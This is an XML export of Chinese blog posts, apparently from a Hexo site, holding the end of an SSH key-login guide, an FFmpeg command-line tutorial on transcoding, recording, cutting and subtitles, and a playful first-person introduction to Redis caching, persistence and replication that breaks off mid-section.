AuthorizedKeysFile      .ssh&#x2F;authorized_keys

# 重启ssh服务
systemctl restart sshd

# 返回Windows，打开cmd
ssh centos # 这里的centos, 对应config文件中Host配置的内容

Linux操作顺序一致，无需安装git环境，不过需要确保ssh和scp命令可执行
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>FFmpeg视频处理入门教程</title>
    <url>/2021/06/23/FFmpeg%E8%A7%86%E9%A2%91%E5%A4%84%E7%90%86%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[FFmpeg 是视频处理最常用的开源软件。
它功能强大，用途广泛，大量用于视频网站和商业软件（比如 Youtube 和 iTunes），也是许多音频和视频格式的标准编码 / 解码实现。
FFmpeg 本身是一个庞大的项目，包含许多组件和库文件，最常用的是它的命令行工具。本文介绍 FFmpeg 命令行如何处理视频，比桌面视频处理软件更简洁高效。
如果你还没安装，可以根据官方文档 先完成安装。


概念介绍 FFmpeg 用法之前，需要了解一些视频处理的基本概念。
容器视频文件本身其实是一个容器（container），里面包括了视频和音频，也可能有字幕等其他内容。
常见的容器格式有以下几种。一般来说，视频文件的后缀名反映了它的容器格式。

  MP4
  MKV
  WebM
  AVI

下面的命令查看 FFmpeg 支持的容器。
$ ffmpeg -formats

编码格式视频和音频都需要经过编码，才能保存成文件。不同的编码格式（CODEC），有不同的压缩率，会导致文件大小和清晰度的差异。
常用的视频编码格式如下。

  H.262
  H.264
  H.265

上面的编码格式都是有版权的，但是可以免费使用。此外，还有几种无版权的视频编码格式。

  VP8
  VP9
  AV1

常用的音频编码格式如下。

  MP3
  AAC

上面所有这些都是有损的编码格式，编码后会损失一些细节，以换取压缩后较小的文件体积。无损的编码格式压缩出来的文件体积较大，这里就不介绍了。
下面的命令可以查看 FFmpeg 支持的编码格式，视频编码和音频编码都在内。
$ ffmpeg -codecs

编码器编码器（encoders）是实现某种编码格式的库文件。只有安装了某种格式的编码器，才能实现该格式视频 / 音频的编码和解码。
以下是一些 FFmpeg 内置的视频编码器。

  libx264：最流行的开源 H.264 编码器
  NVENC：基于 NVIDIA GPU 的 H.264 编码器
  libx265：开源的 HEVC 编码器
  libvpx：谷歌的 VP8 和 VP9 编码器
  libaom：AV1 编码器

音频编码器如下。

  libfdk-aac
  aac

下面的命令可以查看 FFmpeg 已安装的编码器。
$ ffmpeg -encoders

FFmpeg 使用格式FFmpeg 的命令行参数非常多，可以分成五个部分。
$ ffmpeg &#123;1&#125; &#123;2&#125; -i &#123;3&#125; &#123;4&#125; &#123;5&#125;

上面命令中，五个部分的参数依次如下。

 全局参数
 输入文件参数
 输入文件
 输出文件参数
 输出文件

参数太多的时候，为了便于查看，FFmpeg 命令可以写成多行。
$ ffmpeg \
[全局参数] \
[输入文件参数] \
-i [输入文件] \
[输出文件参数] \
[输出文件]

下面是一个例子。
$ ffmpeg \
-y \ # 全局参数
-c:a libfdk_aac -c:v libx264 \ # 输入文件参数
-i input.mp4 \ # 输入文件
-c:v libvpx-vp9 -c:a libvorbis \ # 输出文件参数
output.webm # 输出文件

上面的命令将 mp4 文件转成 webm 文件，这两个都是容器格式。输入的 mp4 文件的音频编码格式是 aac，视频编码格式是 H.264；输出的 webm 文件的视频编码格式是 VP9，音频格式是 Vorbis。
如果不指明编码格式，FFmpeg 会自己判断输入文件的编码。因此，上面的命令可以简单写成下面的样子。
$ ffmpeg -i input.avi output.mp4

常用命令行参数FFmpeg 常用的命令行参数如下。

  -c：指定编码器
  -c copy：直接复制，不经过重新编码（这样比较快）
  -c:v：指定视频编码器
  -c:a：指定音频编码器
  -i：指定输入文件
  -an：去除音频流
  -vn：去除视频流
  -r：视频帧率
  -preset：指定输出的视频质量，会影响文件的生成速度，有以下几个可用的值 ultrafast, superfast, veryfast, faster, fast, medium, slow, slower, veryslow。
  -y：不经过确认，输出时直接覆盖同名文件。

常见用法下面介绍 FFmpeg 几种常见用法。
查看文件信息查看视频文件的元信息，比如编码格式和比特率，可以只使用-i参数。
$ ffmpeg -i input.mp4

上面命令会输出很多冗余信息，加上-hide_banner参数，可以只显示元信息。
$ ffmpeg -i input.mp4 -hide_banner

查看可用设备$ ffmpeg -list_devices true -f dshow -i dummy
[dshow @ 000001d3da482240] DirectShow video devices (some may be both video and audio devices)
[dshow @ 000001d3da482240]  &quot;Integrated Camera&quot;
[dshow @ 000001d3da482240]     Alternative name &quot;@device_pnp_\\?\usb#vid_04ca&amp;pid_7070&amp;mi_00#6&amp;2102d5ea&amp;0&amp;0000#&#123;65e8773d-8f56-11d0-a3b9-00a0c9223196&#125;\global&quot;
[dshow @ 000001d3da482240] DirectShow audio devices
[dshow @ 000001d3da482240]  &quot;麦克风阵列 (Realtek(R) Audio)&quot;
[dshow @ 000001d3da482240]     Alternative name &quot;@device_cm_&#123;33D9A762-90C8-11D0-BD43-00A0C911CE86&#125;\wave_&#123;BE0CB07D-AB72-4606-86E9-5F102ACAEF89&#125;&quot;
dummy: Immediate exit requested

查看设备使用可选项$ ffmpeg -list_options true -f dshow -i video&#x3D;&quot;Integrated Camera&quot;
[dshow @ 000001751d612280] DirectShow video device options (from video devices)
[dshow @ 000001751d612280]  Pin &quot;捕获&quot; (alternative pin name &quot;捕获&quot;)
[dshow @ 000001751d612280]   vcodec&#x3D;mjpeg  min s&#x3D;1280x720 fps&#x3D;30 max s&#x3D;1280x720 fps&#x3D;30
[dshow @ 000001751d612280]   vcodec&#x3D;mjpeg  min s&#x3D;320x180 fps&#x3D;30 max s&#x3D;320x180 fps&#x3D;30
[dshow @ 000001751d612280]   vcodec&#x3D;mjpeg  min s&#x3D;320x240 fps&#x3D;30 max s&#x3D;320x240 fps&#x3D;30
[dshow @ 000001751d612280]   vcodec&#x3D;mjpeg  min s&#x3D;352x288 fps&#x3D;30 max s&#x3D;352x288 fps&#x3D;30
[dshow @ 000001751d612280]   vcodec&#x3D;mjpeg  min s&#x3D;424x240 fps&#x3D;30 max s&#x3D;424x240 fps&#x3D;30
[dshow @ 000001751d612280]   vcodec&#x3D;mjpeg  min s&#x3D;640x360 fps&#x3D;30 max s&#x3D;640x360 fps&#x3D;30
[dshow @ 000001751d612280]   vcodec&#x3D;mjpeg  min s&#x3D;640x480 fps&#x3D;30 max s&#x3D;640x480 fps&#x3D;30
[dshow @ 000001751d612280]   vcodec&#x3D;mjpeg  min s&#x3D;848x480 fps&#x3D;30 max s&#x3D;848x480 fps&#x3D;30
[dshow @ 000001751d612280]   vcodec&#x3D;mjpeg  min s&#x3D;960x540 fps&#x3D;30 max s&#x3D;960x540 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;yuyv422  min s&#x3D;1280x720 fps&#x3D;10 max s&#x3D;1280x720 fps&#x3D;10
[dshow @ 000001751d612280]   pixel_format&#x3D;bgr24  min s&#x3D;1280x720 fps&#x3D;10 max s&#x3D;1280x720 fps&#x3D;10
[dshow @ 000001751d612280]   pixel_format&#x3D;yuyv422  min s&#x3D;320x180 fps&#x3D;30 max s&#x3D;320x180 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;bgr24  min s&#x3D;320x180 fps&#x3D;30 max s&#x3D;320x180 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;yuyv422  min s&#x3D;320x240 fps&#x3D;30 max s&#x3D;320x240 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;bgr24  min s&#x3D;320x240 fps&#x3D;30 max s&#x3D;320x240 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;yuyv422  min s&#x3D;352x288 fps&#x3D;30 max s&#x3D;352x288 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;bgr24  min s&#x3D;352x288 fps&#x3D;30 max s&#x3D;352x288 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;yuyv422  min s&#x3D;424x240 fps&#x3D;30 max s&#x3D;424x240 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;bgr24  min s&#x3D;424x240 fps&#x3D;30 max s&#x3D;424x240 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;yuyv422  min s&#x3D;640x360 fps&#x3D;30 max s&#x3D;640x360 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;bgr24  min s&#x3D;640x360 fps&#x3D;30 max s&#x3D;640x360 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;yuyv422  min s&#x3D;640x480 fps&#x3D;30 max s&#x3D;640x480 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;bgr24  min s&#x3D;640x480 fps&#x3D;30 max s&#x3D;640x480 fps&#x3D;30
[dshow @ 000001751d612280]   pixel_format&#x3D;yuyv422  min s&#x3D;848x480 fps&#x3D;20 max s&#x3D;848x480 fps&#x3D;20
[dshow @ 000001751d612280]   pixel_format&#x3D;bgr24  min s&#x3D;848x480 fps&#x3D;20 max s&#x3D;848x480 fps&#x3D;20
[dshow @ 000001751d612280]   pixel_format&#x3D;yuyv422  min s&#x3D;960x540 fps&#x3D;15 max s&#x3D;960x540 fps&#x3D;15
[dshow @ 000001751d612280]   pixel_format&#x3D;bgr24  min s&#x3D;960x540 fps&#x3D;15 max s&#x3D;960x540 fps&#x3D;15

录制视频安装 https://github.com/rdp/screen-capture-recorder-to-video-windows-free
摄像头
# 实时录制摄像头画面 - Windows适用
$ ffplay -f dshow \
-i video&#x3D;&quot;摄像头设备名称&quot; \
-r 30 \
-vcodec libx264

桌面
# 实时录制桌面画面 - Windows适用
$ ffmpeg -f gdigrab \
-i desktop \
-f mp4 \
-preset ultrafast \
screen_capture.mp4

录制音频# Windows适用
$ ffmpeg -f dshow \
-i audio&#x3D;&quot;音频设备名称&quot; \
audio.aac

录制音视频$ ffmpeg -f gdigrab -t 30 -framerate 15 -i desktop -f dshow -i audio&#x3D;&quot;音频设备名称&quot; \ 
 -b:v 3M -pixel_format yuv420p -vcodec libx264 -s 1366x768 -y # 可选，非必须
 video.flv


-f 指定采集数据方式，一般为dshow或gdigrab。

gdigrab为系统自带，只能录屏幕，没声音；
dshow需装directX，优点是可以指定多个输入，比如下载安装screen capture recorder后，可将其作为dshow模式下的视频输入，可将virtual-audio-capturer作为dshow模式下的音频输入，实现录屏的同时录音。


-i 指定输入，desktop表示gdigrab采集模式输入全部桌面。dshow模式下自己指定，如：-i video=&quot;screen-capture-recorder&quot; -i audio=&quot;virtual-audio-capturer&quot;

-t 表示录屏时间，缺省则没有录屏时间限制，会一直录，录到手动停止或强制关闭

-framerate 表示帧率。对屏幕录制来说，一般15帧就够了，太大的话会很占资源，cpu占用率、内存、存储空间占用等都会很高。

-s 表示分辨率

-b:v 表示码率，如：-b:v 3M。大一点清楚，但是占资源，自己权衡吧。

-pixel_format 表示像素格式，如yuv420p等，注意选择不同的像素格式会影响资源占用率和视频质量，自己研究吧。

-vcodec 表示编码方式。libx264表示软编码，编码器的库为x264。你可以选择其他的，不同的编码方式也会影响资源占用率和视频质量，自己研究吧。此外可以用硬件加速，硬编解码有3种常见的方式，例如：-vcodec h264_qsv，即使用集显加速；例如： -vcodec h264_nvenc，即使用N卡加速；例如： -vcodec h264_amf，即使用A卡加速。开启硬件加速的情况下可大大降低CPU的占用率

-y 表示覆盖同名文件

video.flv为输出文件名，格式虽然mp4较为常见，但我建议用flv格式，因为如果中间有录制损坏，mp4整个就播放不了了，但flv能。


转换编码格式转换编码格式（transcoding）指的是， 将视频文件从一种编码转成另一种编码。比如转成 H.264 编码，一般使用编码器libx264，所以只需指定输出文件的视频编码器即可。
$ ffmpeg -i [input.file] -c:v libx264 output.mp4

下面是转成 H.265 编码的写法。
$ ffmpeg -i [input.file] -c:v libx265 output.mp4

转换容器格式转换容器格式（transmuxing）指的是，将视频文件从一种容器转到另一种容器。下面是 mp4 转 webm 的写法。
$ ffmpeg -i input.mp4 -c copy output.webm

上面例子中，只是转一下容器，内部的编码格式不变，所以使用-c copy指定直接拷贝，不经过转码，这样比较快。
调整码率
码率，即波特率。值越小，转换后的视频越小。
码率就是数据传输时单位时间传送的数据位数,一般我们用的单位是kbps即千位每秒。
码率与体积成正比：码率越大，体积越大；码率越小，体积越小。由于文件体积与取样率是成正比的，所以几乎所有的编码格式都想用最低的码率达到最少的失真，“码率”就是失真度，码率越高越清晰，反之则画面粗糙而且马赛克多。

下面的例子指定码率最小为 964K，最大为 3856K，缓冲区大小为 2000K。
$ ffmpeg \
-i input.mp4 \
-minrate 964K -maxrate 3856K -bufsize 2000K \
output.mp4

-b 输出文件的码率（ffmpeg.exe -i test.MP4 -b 600k output.mp4）
调整分辨率
指的是视频的分辨率，常见的分辨率有40962304,19201080,720*576等。

下面是改变视频分辨率（transsizing）的例子，从 1080p 转为 480p 。
$ ffmpeg \
-i input.mp4 \
-vf scale&#x3D;480:-1 \
output.mp4

-s 输出文件的分别率（ffmpeg.exe -i test.MP4 -s 1920*1080 output.mp4）
调整帧率
帧率（即视频更新率），就是每秒编码进视频文件的帧数目，是用于测量显示帧数的量度。
测量单位为“每秒显示帧数”（Frame Per Second，FPS，帧率）或“赫兹”，单位用FPS用来描述视频每秒播放多少帧，而单位用赫兹用来描述显示器的画面每秒更新多少次。
常见的帖率有25、30，高清电视有50、60帧。
一般帧率越高，视频画面越流畅。但是人类的眼睛需要每秒至少15帧才能将图像连贯在一起~

下面是改变视频分辨率（transsizing）的例子，从 1080p 转为 480p 。
$ ffmpeg \
-i input.mp4 \
-vf scale&#x3D;480:-1 \
output.mp4

-s 输出文件的分别率（ffmpeg.exe -i test.MP4 -s 1920*1080 output.mp4）
提取视频有时，需要从音视频里面提取视频（demuxing），可以像下面这样写。
$ ffmpeg \
-i input.mp4 \
-an -c:v copy \
output.mp4

上面例子中，-vn表示去掉视频，-c:a copy表示不改变音频编码，直接拷贝。
提取音频有时，需要从音视频里面提取音频（demuxing），可以像下面这样写。
$ ffmpeg \
-i input.mp4 \
-vn -c:a copy \
output.aac

上面例子中，-vn表示去掉视频，-c:a copy表示不改变音频编码，直接拷贝。
添加音轨添加音轨（muxing）指的是，将外部音频加入视频，比如添加背景音乐或旁白。
$ ffmpeg \
-i input.aac -i input.mp4 \
output.mp4

上面例子中，有音频和视频两个输入文件，FFmpeg 会将它们合成为一个文件。
截图下面的例子是从指定时间开始，连续对 1 秒钟的视频进行截图。
$ ffmpeg \
-y \
-i input.mp4 \
-ss 00:01:24 -t 00:00:01 \
output_%3d.jpg

如果只需要截一张图，可以指定只截取一帧。
$ ffmpeg \
-ss 01:23:45 \
-i input \
-vframes 1 \
-q:v 2 \
output.jpg

上面例子中，-vframes 1指定只截取一帧，-q:v 2表示输出的图片质量，一般是 1 到 5 之间（1 为质量最高）。
裁剪裁剪（cutting）指的是，截取原始视频里面的一个片段，输出为一个新视频。可以指定开始时间（start）和持续时间（duration），也可以指定结束时间（end）。
$ ffmpeg -ss [start] -i [input] -t [duration] -c copy [output]
$ ffmpeg -ss [start] -i [input] -to [end] -c copy [output]

下面是实际的例子。
$ ffmpeg -ss 00:01:50 -i [input] -t 10.5 -c copy [output]
$ ffmpeg -ss 2.5 -i [input] -to 10 -c copy [output]

上面例子中，-c copy表示不改变音频和视频的编码格式，直接拷贝，这样会快很多。
为音频添加封面有些视频网站只允许上传视频文件。如果要上传音频文件，必须为音频添加封面，将其转为视频，然后上传。
下面命令可以将音频文件，转为带封面的视频文件。
$ ffmpeg \
-loop 1 \
-i cover.jpg -i input.mp3 \
-c:v libx264 -c:a aac -b:a 192k -shortest \
output.mp4

上面命令中，有两个输入文件，一个是封面图片cover.jpg，另一个是音频文件input.mp3。-loop 1参数表示图片无限循环，-shortest参数表示音频文件结束，输出视频就结束。
字幕格式转换ffmpeg -i test_1280x720_3.srt test_1280x720_3_1.vtt
ffmpeg -i test_1280x720_3.srt test_1280x720_3_1.ass

添加硬字幕ffmpeg -i test_1280x720_3.mkv -vf subtitles&#x3D;test_1280x720_3.srt out.mp4

添加软字幕ffmpeg -i test_1280x720_3.mp4 -i test_1280x720_3.srt -c copy output.mkv

参考链接
  http://www.ruanyifeng.com/blog/2020/01/ffmpeg.html
  https://www.cnblogs.com/kybs0/p/12771572.html
  https://blog.csdn.net/awangdea99/article/details/114555743
  https://zhuanlan.zhihu.com/p/145312133

]]></content>
      <tags>
        <tag>ffmpeg</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis入门了解</title>
    <url>/2021/04/02/Redis%E5%85%A5%E9%97%A8%E4%BA%86%E8%A7%A3/</url>
    <content><![CDATA[我是 Redis你好，我是 Redis，一个叫 Antirez 的男人把我带到了这个世界上。
说起我的诞生，跟关系数据库 MySQL 还挺有渊源的。
在我还没来到这个世界上的时候，MySQL 过的很辛苦，互联网发展的越来越快，它容纳的数据也越来越多，用户请求也随之暴涨，而每一个用户请求都变成了对它的一个又一个读写操作，MySQL 是苦不堪言。尤其是到 “双 11”、“618“这种全民购物狂欢的日子，都是 MySQL 受苦受难的日子。
据后来 MySQL 告诉我说，其实有一大半的用户请求都是读操作，而且经常都是重复查询一个东西，浪费它很多时间去进行磁盘 I/O。
后来有人就琢磨，是不是可以学学 CPU，给数据库也加一个缓存呢？于是我就诞生了！
出生不久，我就和 MySQL 成为了好朋友，我们俩常常携手出现在后端服务器中。
应用程序们从 MySQL 查询到的数据，在我这里登记一下，后面再需要用到的时候，就先找我要，我这里没有再找 MySQL 要。



为了方便使用，我支持好几种数据结构的存储：


String
Hash
List
Set
SortedSet
Bitmap
······


因为我把登记的数据都记录在内存中，不用去执行慢如蜗牛的 I/O 操作，所以找我要比找 MySQL 要省去了不少的时间呢。
可别小瞧这简单的一个改变，我可为 MySQL 减轻了不小的负担！随着程序的运行，我缓存的数据越来越多，有相当部分时间我都给它挡住了用户请求，这一下它可乐得清闲自在了！
有了我的加入，网络服务的性能提升了不少，这都归功于我为数据库挨了不少枪子儿。
缓存遇到的几个问题缓存过期 &amp;&amp; 缓存淘汰不过很快我发现事情不妙了，我缓存的数据都是在内存中，可是就算是在服务器上，内存的空间资源还是很有限的，不能无节制的这么存下去，我得想个办法，不然吃枣药丸。
不久，我想到了一个办法：给缓存内容设置一个超时时间，具体设置多长交给应用程序们去设置，我要做的就是把过期了的内容从我里面删除掉，及时腾出空间就行了。

超时时间有了，我该在什么时候去干这个清理的活呢？
最简单的就是定期删除，我决定 100ms 就做一次，一秒钟就是 10 次！
我清理的时候也不能一口气把所有过期的都给删除掉，我这里面存了大量的数据，要全面扫一遍的话那不知道要花多久时间，会严重影响我接待新的客户请求的！

时间紧任务重，我只好随机选择一部分来清理，能缓解内存压力就行了。
就这样过了一段日子，我发现有些个键值运气比较好，每次都没有被我的随机算法选中，每次都能幸免于难，这可不行，这些长时间过期的数据一直霸占着不少的内存空间！气抖冷！
我眼里可揉不得沙子！于是在原来定期删除的基础上，又加了一招：
那些原来逃脱我随机选择算法的键值，一旦遇到查询请求，被我发现已经超期了，那我就绝不客气，立即删除。
这种方式因为是被动式触发的，不查询就不会发生，所以也叫惰性删除！
可是，还是有部分键值，既逃脱了我的随机选择算法，又一直没有被查询，导致它们一直逍遥法外！而于此同时，可以使用的内存空间却越来越少。

而且就算退一步讲，我能够把过期的数据都删除掉，那万一过期时间设置的很长，还没等到我去清理，内存就吃满了，一样要吃枣药丸，所以我还得想个办法。
我苦思良久，终于憋出了个大招：内存淘汰策略，这一次我要彻底解决问题！
我提供了 8 种策略供应用程序选择，用于我遇到内存不足时该如何决策：


noeviction：返回错误，不会删除任何键值
allkeys-lru：使用 LRU 算法删除最近最少使用的键值
volatile-lru：使用 LRU 算法从设置了过期时间的键集合中删除最近最少使用的键值
allkeys-random：从所有 key 随机删除
volatile-random：从设置了过期时间的键的集合中随机删除
volatile-ttl：从设置了过期时间的键中删除剩余时间最短的键
volatile-lfu：从配置了过期时间的键中删除使用频率最少的键
allkeys-lfu：从所有键中删除使用频率最少的键


有了上面几套组合拳，我再也不用担心过期数据多了把空间撑满的问题了~
缓存穿透 &amp;&amp; 布隆过滤器我的日子过的还挺舒坦，不过 MySQL 大哥就没我这么舒坦了，有时候遇到些烦人的请求，查询的数据不存在，MySQL 就要白忙活一场！不仅如此，因为不存在，我也没法缓存啊，导致同样的请求来了每次都要去让 MySQL 白忙活一场。我作为缓存的价值就没得到体现啦！这就是人们常说的缓存穿透。

 这一来二去，MySQL 大哥忍不住了：“唉，兄弟，能不能帮忙想个办法，把那些明知道不会有结果的查询请求给我挡一下”
这时我想到了我的另外一个好朋友：布隆过滤器

我这位朋友别的本事没有，就擅长从超大的数据集中快速告诉你查找的数据存不存在（悄悄告诉你，我的这位朋友有一点不靠谱，它告诉你存在的话不能全信，其实有可能是不存在的，不过它他要是告诉你不存在的话，那就一定不存在）。

如果你对我这位朋友感兴趣的话，可以看看这里《白话布隆过滤器 BloomFilter》。
我把这位朋友介绍给了应用程序，不存在的数据就不必去叨扰 MySQL 了，轻松帮忙解决了缓存穿透的问题。
缓存击穿 &amp;&amp; 缓存雪崩这之后过了一段时间太平日子，直到那一天 ···
有一次，MySQL 那家伙正优哉游哉的摸鱼，突然一大堆请求给他怼了过去，给他打了一个措手不及。
一阵忙活之后，MySQL 怒气冲冲的找到了我，“兄弟，咋回事啊，怎么一下子来的这么猛”

我查看了日志，赶紧解释到：“大哥，实在不好意思，刚刚有一个热点数据到了过期时间，被我删掉了，不巧的是随后就有对这个数据的大量查询请求来了，我这里已经删了，所以请求都发到你那里来了”
“你这干的叫啥事，下次注意点啊”，MySQL 大哥一脸不高兴的离开了。
这一件小事我也没怎么放在心上，随后就抛之脑后了，却没曾想几天之后竟捅了更大的篓子。
那一天，又出现了大量的网络请求发到了 MySQL 那边，比上一次的规模大得多，MySQL 大哥一会儿功夫就给干趴下了好几次！
等了好半天这一波流量才算过去，MySQL 才缓过神来。
“老弟，这一次又是什么原因？”，MySQL 大哥累的没了力气。
“这一次比上一次更不巧，这一次是一大批数据几乎同时过了有效期，然后又发生了很多对这些数据的请求，所以比起上一次这规模更大了”

MySQL 大哥听了眉头一皱，“那你倒是想个办法啊，三天两头折磨我，这谁顶得住啊？”
“其实我也很无奈，这个时间也不是我设置的，要不我去找应用程序说说，让他把缓存过期时间设置的均匀一些？至少别让大量数据集体失效”
“走，咱俩一起去”
后来，我俩去找应用程序商量了，不仅把键值的过期时间随机了一下，还设置了热点数据永不过期，这个问题缓解了不少。哦对了，我们还把这两次发生的问题分别取了个名字：缓存击穿和缓存雪崩。
我们终于又过上了舒适的日子 ···
断电了怎么办？持久化
那天，我正在努力工作中，不小心出了错，整个进程都崩溃了。
当我再次启动后，之前缓存的数据全都没了，暴风雨似的请求再一次全都怼到了 MySQL 大哥那里。
唉，要是我能够记住崩溃前缓存的内容就好了 ···

“快醒醒！快醒醒！”，隐隐约约，我听到有人在叫我。
慢慢睁开眼睛，原来旁边是 MySQL 大哥。
“我怎么睡着了？”
“嗨，你刚才是不是出现了错误，整个进程都崩溃了！害得一大堆查询请求都给我怼过来了！”，MySQL 说到。
刚刚醒来，脑子还有点懵，MySQL 大哥扶我起来继续工作。
“糟了！我之前缓存的数据全都不见了！”
“WTF？你没有做持久化吗？”，MySQL 大哥一听脸色都变了。
我尴尬的摇了摇头，“我都是保存在内存中的，所以才那么快啊”
“那也可以在硬盘上保存一下啊，遇到这种情况全部从头再来建立缓存，这不浪费时间嘛！”

我点了点头，“让我琢磨一下，看看怎么做这个持久化”。
RDB 持久化没几天，我就拿出了一套方案：RDB
既然我的数据都在内存中存放着，最简单的就是遍历一遍把它们全都写入文件中。
为了节约空间，我定义了一个二进制的格式，把数据一条一条码在一起，生成了一个 RDB 文件。

不过我的数据量有点大，要是全部备份一次得花不少时间，所以不能太频繁的去做这事，要不然我不用干正事了，光花时间去备份了。
还有啊，要是一直没有写入操作，都是读取操作，那我也不用重复备份，浪费时间。
思来想去，我决定提供一个配置参数，既可以支持周期性备份，也可以避免做无用功。
就像这样：


  save 900 1     # 900 秒（15 分钟）内有 1 个写入
  save 300 10    # 300 秒（5 分钟）内有 10 个写入
  save 60 10000  # 60 秒（1 分钟）内有 10000 个写入


多个条件可以组合使用，只要上面一个条件满足，我就会去进行备份。
后来我又想了一下，这样还是不行，我得 fork 出一个子进程去做这件事，不能浪费我的时间。
有了备份文件，下次我再遇到崩溃退出，甚至服务器断电罢工了，只要我的备份文件还在，我就能在启动的时候读取，快速恢复之前的状态啦！

MySQL: binlog我带着这套方案，兴冲冲的拿给了 MySQL 大哥看了，期待他给我一些鼓励。
“老弟，你这个方案有点问题啊”，没想到，他竟给我浇了一盆冷水。
“问题？有什么问题？”
“你看啊，你这个周期性去备份，周期还是分钟级别的，你可知道咱们这服务每秒钟都要响应多少请求，像你这样不得丢失多少数据？”，MySQL 语重心长的说到。

我一下有些气短了，“可是，这个备份一次要遍历全部数据，开销还是挺大的，不适合高频执行啊”
“谁叫你一次遍历全部数据了？来来来，我给你看个东西”，MySQL 大哥把我带到了一个文件目录下：


  mysql-bin.000001
  mysql-bin.000002
  mysql-bin.000003
  ···


“看，这些是我的二进制日志 binlog，你猜猜看里面都装了些什么？”，MySQL 大哥指着这一堆文件说到。
我看了一眼，全是一堆二进制数据，这哪看得懂，我摇了摇头。
“这里面呀记录了我对数据执行更改的所有操作，像是 INSERT，UPDATE、DELETE 等等动作，等我要进行数据恢复的时候就可以派上大用场了”
听他这么一说，我一下来了灵感！告别了 MySQL 大哥，回去研究起新的方案来了。
AOF 持久化你们也知道，我也是基于命令式的，每天的工作就是响应业务程序发来的命令请求。
回来以后，我决定照葫芦画瓢，学着 MySQL 大哥的样子，把我执行的所有写入命令都记录下来，专门写入了一个文件，并给这种持久化方式也取了一个名字：AOF（Append Only File）。

不过我遇到了 RDB 方案同样的问题，我该多久写一次文件呢？
我肯定不能每执行一条写入命令就记录到文件中，那会严重拖垮我的性能！我决定准备一个缓冲区，然后把要记录的命令先临时保存在这里，然后再择机写入文件，我把这个临时缓冲区叫做 aof_buf。

说干就干，我试了一下，竟然发现数据没有写入到文件中去。多方打听才知道，原来操作系统也有个缓存区，我写的数据被他缓存起来了，没有给我写入到文件中去，这不是坑爹呢嘛！
看来，我写完了还得要去刷新一下，把数据真正给写下去，思来想去，我还是提供一个参数，让业务程序去设置什么时候刷新吧。

appendfsync参数，三个取值：

  always: 每个事件周期都同步刷新一次
  everysec: 每一秒都同步刷新一次
  no: 我只管写，让操作系统自己决定什么时候真正写入吧


AOF 重写这一次我不像之前那么冲动，我决定先试运行一段时间再去告诉 MySQL 大哥，免得又被他戳到软肋。
试用了一段时间，各方面都运行良好，不过我发现随着时间的推移，我写的这个 AOF 备份文件越来越大，越来越大！不仅非常占硬盘空间，复制移动，加载分析都非常的麻烦耗时。
我得想个办法把文件给压缩一下，我把这个过程叫做 AOF 重写。

一开始，我打算去分析原来的 AOF 文件，然后将其中的冗余指令去掉，来给 AOF 文件瘦瘦身，不过我很快放弃了这个想法，这工作量实在太大了，分析起来也颇为麻烦，浪费很多精力跟时间。
原来的一条条记录这种方式实在是太笨了，数据改来改去，有很多中间状态都没用，我何不就把最终都数据状态记录下来就好了？
比如：


  RPUSH name_list &#39;编程技术宇宙&#39;
  RPUSH name_list &#39;帅地玩编程&#39;
  RPUSH name_list &#39;后端技术学堂&#39;

可以合并成一条搞定：

  RPUSH name_list &#39;编程技术宇宙&#39; &#39;帅地玩编程&#39; &#39;后端技术学堂&#39;


AOF 文件重写的思路我是有了，不过这件事干起来还是很耗时间，我决定和 RDB 方式一样，fork 出一个子进程来做这件事情。
谨慎如我，发现这样做之后，子进程在重写期间，我要是修改了数据，就会出现和重写的内容不一致的情况！MySQL 大哥肯定会挑刺儿，我还得把这个漏洞给补上。

于是，我在之前的 aof_buf 之外，又准备了一个缓冲区：AOF 重写缓冲区。
从创建重写子进程开始的那一刻起，我把后面来的写入命令也 copy 一份写到这个重写缓冲区中，等到子进程重写 AOF 文件结束之后，我再把这个缓冲区中的命令写入到新的 AOF 文件中。
最后再重命名新的 AOF 文件，替换掉原来的那个臃肿不堪的大文件，终于大功告成！

再三确定我的思路没有问题之后，我带着新的方案再次找到了 MySQL 大哥，我都做到这份儿上了，这一次，想必他应该无话可说了吧？
MySQL 大哥看了我的方案露出了满意的笑容，只是问了一个问题：

这 AOF 方案这么好了，RDB 方案是不是可以不要了呢？

万万没想到，他居然问我这个问题，我竟陷入了沉思，你觉得我该怎么回答好呢？

RDB优点： 全量数据快照，文件小，恢复快。
RDB缺点：无法保存最后一次快照之后的数据。
AOF优点：可读性高适合保存增强数据，数据不易丢失。
AOF缺点：文件体积大，恢复时间长。
RDB-AOF混合持久化模式。

一个好汉，三个帮。高可用
“你怎么又崩溃了？”
“不好意思，又遇到 bug 了，不过不用担心，我现在可以快速恢复了！”
“那老崩溃也不是事儿啊，你只有一个实例太不可靠了，去找几个帮手吧！”

那天，Redis 基友群里，许久未见的大白发来了一条消息 ···
                             
主从模式于是，大白拉了一个新的群


以后的日子中，咱们哥仨相互配合，日常工作中最多的就是数据同步了


如果主节点有数据写入、删除、修改命令，也会把这些命令挨个通知到从节点，我们把这叫做命令传播。


通过这样的方式，我们主节点与从节点之间数据就能保持同步了～
缓冲区、复制偏移量、运行ID
新的版本使用完整重同步和部分重同步 而部分重同步可以解决下面的问题
部分重同步分为三个部分：主服务器的复制偏移量、主服务器的复制积压缓冲区、服务器的运行ID。
如果主从服务器的复制偏移量不一样那么就去复制积压缓冲区查找，如果从的偏移量在缓冲区那么就进行部分重同步操作，
如果没有那么就进行完整重同步操作。
每个redis服务器都有自己的运行ID
断线重连后通过服务器运行ID判断重新连接的是否是之前的主服务器如果是则进行部分重同步操作
如果不是则进行完整重同步操作。

有一次，我不小心掉线了～
                              
